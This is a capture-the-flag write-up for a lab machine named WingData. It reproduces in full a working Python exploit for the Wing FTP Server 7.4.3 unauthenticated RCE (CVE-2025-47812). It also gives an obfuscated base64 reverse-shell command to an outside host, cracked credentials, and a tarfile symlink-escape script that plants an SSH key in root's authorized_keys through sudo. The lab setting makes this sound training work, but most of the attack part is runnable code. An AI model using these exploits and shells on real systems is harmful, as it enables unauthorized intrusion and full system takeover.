# Enumeration

First step is running nmap command

The command I ran is:
```
sudo nmap -sC -sV -vv -oA wingdata [Machine IP]
```

Here's the output:
```
# Nmap 7.98 scan initiated Sat Feb 14 14:10:36 2026 as: /usr/lib/nmap/nmap -sC -sV -vv -oA wingdata 10.129.6.26
Nmap scan report for 10.129.6.26
Host is up, received reset ttl 63 (0.31s latency).
Scanned at 2026-02-14 14:10:37 EST for 43s
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL+8LZAmzRfTy+4t8PJxEvRWhPho8aZj9ImxRfWn9TKepkxh8pAF3WDu55pd/gaSUGIo9cuOvv+3r6w7IuCpqI4=
|   256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFFmcxflCAAe4LPgkg7hOxJen41bu6zaE/y08UnA4oRp
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.66
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.66 (Debian)
|_http-title: Did not follow redirect to http://wingdata.htb/
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Feb 14 14:11:20 2026 -- 1 IP address (1 host up) scanned in 44.06 seconds
```

There are 2 ports open
22, which is `SSH`, and the banner tells us its a `Debian` server
80, which is `HTTP`, and its running `Apache httpd 2.4.66`

![[Pasted image 20260216200557.png]]

Here is the webpage

On further enumeration, I found a subdomain linked to the machine, named `ftp.wingdata.htb`
![[Pasted image 20260216200706.png]]

This is the `ftp webpage`

It is running `WingFTP server v7.4.3`
On searching through google, I found a CVE for this version of WingFTP, `CVE-2025-47812`
https://www.exploit-db.com/exploits/52347

Here's the CVE code:
```
# Exploit Title: Wing FTP Server 7.4.3 - Unauthenticated Remote Code Execution (RCE)
# CVE: CVE-2025-47812
# Date: 2025-06-30
# Exploit Author: Sheikh Mohammad Hasan aka 4m3rr0r (https://github.com/4m3rr0r)
# Vendor Homepage: https://www.wftpserver.com/
# Version: Wing FTP Server <= 7.4.3
# Tested on: Linux (Root Privileges), Windows (SYSTEM Privileges)

# Description:
# Wing FTP Server versions prior to 7.4.4 are vulnerable to an unauthenticated remote code execution (RCE)
# flaw (CVE-2025-47812). This vulnerability arises from improper handling of NULL bytes in the 'username'
# parameter during login, leading to Lua code injection into session files. These maliciously crafted
# session files are subsequently executed when authenticated functionalities (e.g., /dir.html) are accessed,
# resulting in arbitrary command execution on the server with elevated privileges (root on Linux, SYSTEM on Windows).
# The exploit leverages a discrepancy between the string processing in c_CheckUser() (which truncates at NULL)
# and the session creation logic (which uses the full unsanitized username).

# Proof-of-Concept (Python):
# The provided Python script automates the exploitation process.
# It injects a NULL byte followed by Lua code into the username during a POST request to loginok.html.
# Upon successful authentication (even anonymous), a UID cookie is returned.
# A subsequent GET request to dir.html using this UID cookie triggers the execution of the injected Lua code,
# leading to RCE.


import requests
import re
import argparse

# ANSI color codes
RED = "\033[91m"
GREEN = "\033[92m"
RESET = "\033[0m"

def print_green(text):
    print(f"{GREEN}{text}{RESET}")

def print_red(text):
    print(f"{RED}{text}{RESET}")

def run_exploit(target_url, command, username="anonymous", verbose=False):
    login_url = f"{target_url}/loginok.html"

    login_headers = {
        "Host": target_url.split('//')[1].split('/')[0],
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": target_url,
        "Connection": "keep-alive",
        "Referer": f"{target_url}/login.html?lang=english",
        "Cookie": "client_lang=english",
        "Upgrade-Insecure-Requests": "1",
        "Priority": "u=0, i"
    }


    from urllib.parse import quote
    encoded_username = quote(username)

    payload = (
        f"username={encoded_username}%00]]%0dlocal+h+%3d+io.popen(\"{command}\")%0dlocal+r+%3d+h%3aread(\"*a\")"
        "%0dh%3aclose()%0dprint(r)%0d--&password="
    )

    if verbose:
        print_green(f"[+] Sending POST request to {login_url} with command: '{command}' and username: '{username}'")

    try:
        login_response = requests.post(login_url, headers=login_headers, data=payload, timeout=10)
        login_response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print_red(f"[-] Error sending POST request to {login_url}: {e}")
        return False

    set_cookie = login_response.headers.get("Set-Cookie", "")
    match = re.search(r'UID=([^;]+)', set_cookie)

    if not match:
        print_red("[-] UID not found in Set-Cookie. Exploit might have failed or response format changed.")
        return False

    uid = match.group(1)
    if verbose:
        print_green(f"[+] UID extracted: {uid}")

    dir_url = f"{target_url}/dir.html"
    dir_headers = {
        "Host": login_headers["Host"],
        "User-Agent": login_headers["User-Agent"],
        "Accept": login_headers["Accept"],
        "Accept-Language": login_headers["Accept-Language"],
        "Accept-Encoding": login_headers["Accept-Encoding"],
        "Connection": "keep-alive",
        "Cookie": f"UID={uid}",
        "Upgrade-Insecure-Requests": "1",
        "Priority": "u=0, i"
    }

    if verbose:
        print_green(f"[+] Sending GET request to {dir_url} with UID: {uid}")

    try:
        dir_response = requests.get(dir_url, headers=dir_headers, timeout=10)
        dir_response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print_red(f"[-] Error sending GET request to {dir_url}: {e}")
        return False

    body = dir_response.text
    clean_output = re.split(r'<\?xml', body)[0].strip()

    if verbose:
        print_green("\n--- Command Output ---")
        print(clean_output)
        print_green("----------------------")
    else:
        if clean_output:
            print_green(f"[+] {target_url} is vulnerable!")
        else:
            print_red(f"[-] {target_url} is NOT vulnerable.")

    return bool(clean_output)

def main():
    parser = argparse.ArgumentParser(description="Exploit script for command injection via login.html.")
    parser.add_argument("-u", "--url", type=str,
                        help="Target URL (e.g., http://192.168.134.130). Required if -f not specified.")
    parser.add_argument("-f", "--file", type=str,
                        help="File containing list of target URLs (one per line).")
    parser.add_argument("-c", "--command", type=str,
                        help="Custom command to execute. Default: whoami. If specified, verbose output is enabled automatically.")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Show full command output (verbose mode). Ignored if -c is used since verbose is auto-enabled.")
    parser.add_argument("-o", "--output", type=str,
                        help="File to save vulnerable URLs.")
    parser.add_argument("-U", "--username", type=str, default="anonymous",
                        help="Username to use in the exploit payload. Default: anonymous")

    args = parser.parse_args()

    if not args.url and not args.file:
        parser.error("Either -u/--url or -f/--file must be specified.")

    command_to_use = args.command if args.command else "whoami"
    verbose_mode = True if args.command else args.verbose

    vulnerable_sites = []

    targets = []
    if args.file:
        try:
            with open(args.file, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print_red(f"[-] Could not read target file '{args.file}': {e}")
            return
    else:
        targets = [args.url]

    for target in targets:
        print(f"\n[*] Testing target: {target}")
        is_vulnerable = run_exploit(target, command_to_use, username=args.username, verbose=verbose_mode)
        if is_vulnerable:
            vulnerable_sites.append(target)

    if args.output and vulnerable_sites:
        try:
            with open(args.output, 'w') as out_file:
                for site in vulnerable_sites:
                    out_file.write(site + "\n")
            print_green(f"\n[+] Vulnerable sites saved to: {args.output}")
        except Exception as e:
            print_red(f"[-] Could not write to output file '{args.output}': {e}")

if __name__ == "__main__":
    main()
            
```

## How the CVE works

- Attacker sends login request with username: `anonymous\x00]]<malicious Lua code>--`
- The NULL byte tricks authentication (sees only "anonymous")
- But the full string (including Lua code) gets written to a session file

I used this payload to get reverse shell:
```
python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c "printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTYuMjMvNDQ0NCAwPiYxKSAm|base64 -d|bash"
```

In the `/opt/wftpserver/Data/1/users`, I found a file named `wacky.xml`

The file contained the password hash for wacky
`32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca`

I cracked this password using Hashcat
`hashcat -m 1400 -a 6 32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca rockyou.txt 'WingFTP'`

Here are the creds `wacky:!#7Blushing^*Bride5`

I used these to SSH into Wacky's user and found the flag inside his $HOME directory
![[{870E12D4-8D0E-49E8-9942-AE59623F638C}.png]]

I ran `sudo -l`
```
wacky@wingdata:~$ sudo -l
Matching Defaults entries for wacky on wingdata:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

The `/opt/backup_clients/restore_backup_clients.py` python file can be run on escalated privilege by Wacky

```
wacky@wingdata:~$ python3 /opt/backup_clients/restore_backup_clients.py --help
usage: restore_backup_clients.py [-h] -b BACKUP -r RESTORE_DIR

Restore client configuration from a validated backup tarball.

options:
  -h, --help            show this help message and exit
  -b BACKUP, --backup BACKUP
                        Backup filename (must be in /home/wacky/backup_clients/ and match backup_<client_id>.tar, where <client_id> is a positive integer,
                        e.g., backup_1001.tar)
  -r RESTORE_DIR, --restore-dir RESTORE_DIR
                        Staging directory name for the restore operation. Must follow the format: restore_<client_user> (e.g., restore_john). Only
                        alphanumeric characters and underscores are allowed in the <client_user> part (1–24 characters).

Example: sudo restore_backup_clients.py -b backup_1001.tar -r restore_john
```

The python file accepts tar files as arguments and restores a file for the users

I found a `tar file overflow` vulnerablity
https://github.com/google/security-research/security/advisories/GHSA-hgqp-3mmf-7h8f

Here is the vibe coded POC I used:
```
cd /tmp
ssh-keygen -t rsa -f rootkey -N ""

# Create the PATH_MAX exploit
cat > pathmax_exploit.py << 'EOF'
import tarfile
import os
import io
import sys

# Create extremely long paths that exceed PATH_MAX (4096 bytes)
# This causes Python's security checks to fail
comp = 'd' * 247  # Component name length
steps = "abcdefghijklmnop"  # 16 levels deep
path = ""
with tarfile.open("/opt/backup_clients/backups/backup_1001.tar", mode="w") as tar:
    # Create nested directory structure with symlinks
    for i in steps:
        # Add directory
        a = tarfile.TarInfo(os.path.join(path, comp))
        a.type = tarfile.DIRTYPE
        tar.addfile(a)
        # Add symlink to directory
        b = tarfile.TarInfo(os.path.join(path, i))
        b.type = tarfile.SYMTYPE
        b.linkname = comp
        tar.addfile(b)
        path = os.path.join(path, comp)
    # Create final symlink that exceeds PATH_MAX
    # When expanded, this path is > 4096 bytes
    linkpath = os.path.join("/".join(steps), "l"*254)
    l = tarfile.TarInfo(linkpath)
    l.type = tarfile.SYMTYPE
    l.linkname = ("../" * len(steps))
    tar.addfile(l)
    # Create symlink that escapes to /root/.ssh/authorized_keys
    e = tarfile.TarInfo("escape")
    e.type = tarfile.SYMTYPE
    e.linkname = linkpath + "/../../../../../root/.ssh/authorized_keys"
    tar.addfile(e)
    # Create hardlink to escaped file
    f = tarfile.TarInfo("flaglink")
    f.type = tarfile.LNKTYPE
    f.linkname = "escape"
    tar.addfile(f)
    # Overwrite with our SSH public key
    content = open("rootkey.pub", "rb").read()
    c = tarfile.TarInfo("flaglink")
    c.type = tarfile.REGTYPE
    c.size = len(content)
    tar.addfile(c, fileobj=io.BytesIO(content))

print("[+] Exploit tar created")
EOF
# Run the exploit
python3 pathmax_exploit.py
# Extract the malicious tar as root
sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_1001.tar -r restore_pwned
```

I got the `rootkey`, which I then used to SSH as root into the machine and got the root flag

![[{AA3B37BE-DE6D-45B6-B559-DFF06B57D1D9}.png]]


